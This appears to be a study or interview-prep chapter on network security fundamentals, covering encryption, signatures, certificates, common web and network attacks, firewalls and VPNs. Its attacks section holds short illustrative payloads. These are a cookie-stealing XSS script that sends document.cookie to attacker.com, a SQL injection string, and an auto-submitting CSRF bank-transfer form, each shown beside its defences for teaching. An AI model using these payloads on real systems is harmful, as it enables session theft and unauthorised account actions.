# 4.6 Network Security (Fundamentals)

## Cryptography Basics

### Encryption Goals (CIA Triad)
1. **Confidentiality**: Only authorized parties can read
2. **Integrity**: Detect tampering
3. **Authentication**: Verify identity
4. **Non-repudiation**: Cannot deny sending

## Symmetric Encryption

### Concept
- **Same key for encryption and decryption**
  - Fast
  - Efficient for large data
  - Key distribution problem

### How It Works
```
Plaintext → [Encrypt with Key K] → Ciphertext
Ciphertext → [Decrypt with Key K] → Plaintext
```

### Algorithms

#### AES (Advanced Encryption Standard)
- **Industry standard**
  - Key sizes: 128, 192, 256 bits
  - Block cipher (128-bit blocks)
  - Very secure
  - Fast in hardware and software
  
- **Use Cases**
  - File encryption
  - Disk encryption
  - Wi-Fi (WPA2/WPA3)
  - HTTPS (after key exchange)

#### DES (Data Encryption Standard)
- **Obsolete**
  - 56-bit key (too small)
  - Broken by brute force
  - Replaced by AES

#### 3DES (Triple DES)
- **Apply DES three times**
  - 168-bit key
  - Slower than AES
  - Being phased out

### Problem: Key Distribution
- **How to share key securely?**
  - If channel is secure, why encrypt?
  - Need public key cryptography

## Asymmetric Encryption (Public Key Cryptography)

### Concept
- **Two keys: public and private**
  - Public key: Freely distributed
  - Private key: Kept secret
  - What one key encrypts, only the other can decrypt

### How It Works

#### Encryption
```
Alice wants to send to Bob:
1. Alice gets Bob's public key
2. Alice encrypts message with Bob's public key
3. Only Bob's private key can decrypt
```

#### Digital Signature
```
Alice wants to sign:
1. Alice encrypts (signs) with her private key
2. Anyone can verify with Alice's public key
3. Proves Alice sent it (authentication)
```

### Algorithms

#### RSA (Rivest-Shamir-Adleman)
- **Most widely used**
  - Key sizes: 2048, 3072, 4096 bits
  - Based on prime factorization difficulty
  - Slow compared to symmetric
  
- **Use Cases**
  - Digital signatures
  - Key exchange (SSL/TLS)
  - Email encryption (PGP)
  - SSH authentication

#### ECC (Elliptic Curve Cryptography)
- **Newer, more efficient**
  - Smaller keys, same security
  - 256-bit ECC ≈ 3072-bit RSA
  - Faster
  - Less power consumption
  
- **Use Cases**
  - Mobile devices
  - IoT (resource-constrained)
  - Bitcoin, cryptocurrencies
  - Modern TLS

#### Diffie-Hellman
- **Key exchange protocol**
  - Two parties agree on shared secret
  - Over insecure channel
  - Doesn't provide authentication (needs signing)

### RSA vs ECC
| Feature | RSA | ECC |
|---------|-----|-----|
| Key size (same security) | 3072 bits | 256 bits |
| Speed | Slower | Faster |
| Maturity | Well-established | Newer |
| Use | Wide support | Growing adoption |

### Symmetric vs Asymmetric
| Feature | Symmetric | Asymmetric |
|---------|-----------|------------|
| Same key? | Yes | No (public/private pair) |
| Speed | Fast | Slow (100-1000x slower) |
| Key distribution | Difficult | Easy (share public key) |
| Use case | Bulk encryption | Key exchange, signatures |

### Hybrid Encryption (Best of Both)
- **HTTPS uses both**
  1. Asymmetric (RSA/ECC): Exchange session key
  2. Symmetric (AES): Encrypt actual data
  - Get security of asymmetric + speed of symmetric

## Digital Signatures

### Purpose
- **Verify authenticity and integrity**
  - Proves who sent message
  - Detects tampering
  - Non-repudiation

### Process
1. **Signing (by sender)**
   - Hash message (SHA-256)
   - Encrypt hash with private key → Signature
   - Send message + signature
   
2. **Verification (by receiver)**
   - Hash received message
   - Decrypt signature with sender's public key → Original hash
   - Compare hashes
   - If match: authentic and unmodified

### Hash Functions
- **One-way function**
  - Input → Fixed-size output (digest)
  - Cannot reverse
  - Small change → Completely different hash
  
- **SHA-256** (Secure Hash Algorithm)
  - 256-bit output
  - Cryptographically secure
  - Bitcoin, certificates
  
- **MD5** (Obsolete)
  - 128-bit output
  - Collision attacks possible
  - Don't use for security

## Certificates & PKI

### Digital Certificate
- **Electronic document**
  - Subject (domain name, organization)
  - Public key
  - Issuer (Certificate Authority)
  - Validity period
  - Signature (by CA's private key)

### Certificate Authority (CA)
- **Trusted third party**
  - Issues certificates
  - Verifies identity
  - Signs certificates
  
- **Root CAs**
  - Trusted by browsers/OS
  - Examples: DigiCert, Let's Encrypt, Comodo

### PKI (Public Key Infrastructure)
- **System for managing certificates**
  - CAs (issue certificates)
  - Registration Authorities (verify identities)
  - Certificate Revocation Lists (CRL)
  - OCSP (Online Certificate Status Protocol)

### Certificate Chain
```
Root CA (self-signed)
   ↓
Intermediate CA (signed by Root)
   ↓
Server Certificate (signed by Intermediate)
```
- **Trust chain**
  - Browser trusts Root CA
  - Root CA vouches for Intermediate
  - Intermediate vouches for Server
  - Therefore, trust Server

### Certificate Verification
1. Check domain name matches
2. Check validity dates
3. Verify signature using CA's public key
4. Check if certificate revoked (CRL/OCSP)
5. Verify entire chain to trusted root

## Common Attacks

### Man-in-the-Middle (MITM)

#### Attack
- **Attacker intercepts communication**
  ```
  Alice → Attacker → Bob
  ```
  - Alice thinks she's talking to Bob
  - Bob thinks he's talking to Alice
  - Attacker can read/modify messages

#### Defense
- **HTTPS/TLS**
  - Certificate verification
  - Encryption
  
- **Public key pinning**
  - Remember server's public key

#### Example: ARP Spoofing
- Attacker sends fake ARP replies
- Redirect traffic through attacker
- Use on LAN

### Denial of Service (DoS)

#### Attack
- **Overwhelm target with traffic**
  - Exhaust resources (CPU, memory, bandwidth)
  - Make service unavailable
  - No data theft (just disruption)

#### Types

##### SYN Flood
- Send many SYN packets
- Don't complete handshake
- Exhaust server's connection table

##### UDP Flood
- Send massive UDP traffic
- No handshake needed

##### HTTP Flood
- Many legitimate-looking HTTP requests
- Harder to detect

#### DDoS (Distributed DoS)
- **Attack from multiple sources**
  - Botnet (compromised computers)
  - Much more powerful
  - Hard to block (many IPs)

#### Defense
- **Rate limiting**
  - Limit requests per IP
  
- **Firewall/IDS**
  - Detect and block malicious patterns
  
- **CDN (Content Delivery Network)**
  - Cloudflare, Akamai
  - Absorb attack traffic
  
- **Load balancing**
  - Distribute traffic

### SQL Injection

#### Attack
- **Inject malicious SQL code**
  - Exploit poor input validation
  - Access/modify/delete database
  
- **Example**
  ```sql
  -- Vulnerable code
  query = "SELECT * FROM users WHERE username='" + input + "'"
  
  -- Attacker inputs: admin' OR '1'='1
  -- Resulting query:
  SELECT * FROM users WHERE username='admin' OR '1'='1'
  -- Returns all users!
  ```

#### Defense
- **Prepared statements (parameterized queries)**
  ```python
  cursor.execute("SELECT * FROM users WHERE username=?", (input,))
  ```
  
- **Input validation**
  - Whitelist allowed characters
  - Escape special characters
  
- **Least privilege**
  - Database user has minimal permissions
  
- **ORM (Object-Relational Mapping)**
  - Abstracts SQL, reduces risk

### Cross-Site Scripting (XSS)

#### Attack
- **Inject malicious JavaScript**
  - Execute in victim's browser
  - Steal cookies, session tokens
  - Redirect to phishing site
  
- **Example**
  ```html
  <!-- Attacker posts comment -->
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
  
  <!-- Victim views page, script executes -->
  ```

#### Types

##### Reflected XSS
- Payload in URL
- Victim clicks link
- Server reflects input in response

##### Stored XSS
- Payload stored in database
- All users affected
- More dangerous

##### DOM-based XSS
- JavaScript modifies DOM
- No server involvement

#### Defense
- **Output encoding/escaping**
  - Convert `<` to `&lt;`, `>` to `&gt;`
  - Prevent script execution
  
- **Content Security Policy (CSP)**
  - HTTP header restricts script sources
  
- **HttpOnly cookies**
  - JavaScript cannot access cookies
  
- **Input validation**
  - Whitelist, not blacklist

### Cross-Site Request Forgery (CSRF)

#### Attack
- **Trick victim into unwanted action**
  ```html
  <!-- Victim is logged into bank.com -->
  <!-- Attacker's site has hidden form -->
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  <script>document.forms[0].submit();</script>
  ```
  - Browser sends cookies automatically
  - Bank thinks it's legitimate request

#### Defense
- **CSRF tokens**
  - Random token in form
  - Server validates token
  - Attacker can't guess token
  
- **SameSite cookies**
  - `Set-Cookie: sessionid=abc; SameSite=Strict`
  - Browser doesn't send cookie on cross-site requests
  
- **Re-authentication**
  - Require password for sensitive actions
  
- **Check Referer header**
  - Verify request from same site

## Firewall

### Purpose
- **Filter network traffic**
  - Block unauthorized access
  - Allow legitimate traffic
  - Based on rules

### Types

#### Packet Filter Firewall
- Layer 3/4
- Checks: source/dest IP, port, protocol
- Fast but limited

#### Stateful Firewall
- Tracks connection state
- Allows return traffic
- More intelligent

#### Application Layer Firewall
- Layer 7
- Inspects application data
- Can block specific HTTP methods, SQL keywords

### Rules
```
ALLOW from 192.168.1.0/24 to any port 80
DENY from any to any port 23 (Telnet)
ALLOW from any to 10.0.0.5 port 22 (SSH)
DENY all other
```

## VPN (Virtual Private Network)

### Purpose
- **Secure tunnel over public network**
  - Encrypt all traffic
  - Hide IP address
  - Access remote network

### Use Cases
- Remote work (access company network)
- Privacy (hide from ISP)
- Bypass geo-restrictions

### Protocols
- **IPsec**: Network layer VPN
- **OpenVPN**: SSL/TLS-based
- **WireGuard**: Modern, fast

## Interview Practice
- [ ] Explain symmetric vs asymmetric encryption
- [ ] How does HTTPS handshake work?
- [ ] What is a digital signature and how does it work?
- [ ] Describe certificate chain of trust
- [ ] Explain Man-in-the-Middle attack and defense
- [ ] What is SQL injection and how to prevent?
- [ ] Describe XSS attack types and mitigations
- [ ] How does CSRF attack work?
- [ ] Compare RSA and ECC
- [ ] Why use both symmetric and asymmetric in HTTPS?
